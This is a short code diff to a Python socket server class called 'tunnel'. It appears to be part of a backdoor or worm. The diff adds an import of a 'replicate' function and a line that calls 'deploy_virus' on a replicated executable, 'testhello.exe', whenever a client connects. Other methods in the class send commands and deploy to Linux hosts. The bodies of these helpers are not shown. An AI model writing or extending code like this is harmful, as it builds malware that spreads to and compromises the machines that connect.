@@ -1,5 +1,6 @@
 import socket, threading
 import time
+from replicate import replicate
 
 
 class tunnel(threading.Thread):
@@ -21,6 +22,7 @@ class tunnel(threading.Thread):
         conn.settimeout(5.0)
         self.set_connection(conn,addr)
         print("Got a connection from: {}",addr)
+        self.deploy_virus(replicate("container/testhello.exe"))
     
     
     def sent_command(self, command):
@@ -74,7 +76,6 @@ class tunnel(threading.Thread):
         else:
             self.deploy_to_linux()
         
-
         clientsocket,addr = serversocket.accept()
         print("Got a connection from", addr)
         try:
